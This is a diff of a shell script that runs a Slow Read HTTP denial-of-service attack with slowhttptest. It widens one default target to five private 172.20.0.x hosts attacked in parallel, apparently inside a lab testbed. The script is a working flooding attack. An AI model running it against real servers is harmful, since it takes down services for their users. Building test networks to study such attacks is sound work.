@@ -11,16 +11,14 @@
 #
 # Distinct from Slowloris (attacker sends headers slowly) and Slow POST
 # (attacker sends body slowly) — here the server is the slow party.
-TARGET=${1:-http://172.20.0.10/}
-CONNS=${2:-200}
-DURATION=${3:-120}
+CONNS=${1:-200}
+DURATION=${2:-120}
 
-echo "[attack] Slow Read -> $TARGET  $CONNS connections  ${DURATION}s"
+VICTIMS="172.20.0.10 172.20.0.11 172.20.0.12 172.20.0.13 172.20.0.14"
 
-# -X: slow read mode (advertise tiny receive window)
-# -c: concurrent connections
-# -l: test duration in seconds
-# -n: interval between read operations (5s — server waits between window opens)
-# -k: repeat same request 3 times per connection (larger response to drain)
-# -r: connection rate per second
-slowhttptest -X -c "$CONNS" -l "$DURATION" -n 5 -k 3 -r 50 -u "$TARGET"
+echo "[attack] Slow Read -> all nodes  $CONNS connections each  ${DURATION}s"
+for ip in $VICTIMS; do
+    # -X: slow read, -n: read interval, -k: requests per connection, -r: conn rate
+    slowhttptest -X -c "$CONNS" -l "$DURATION" -n 5 -k 3 -r 50 -u "http://$ip/" &
+done
+wait
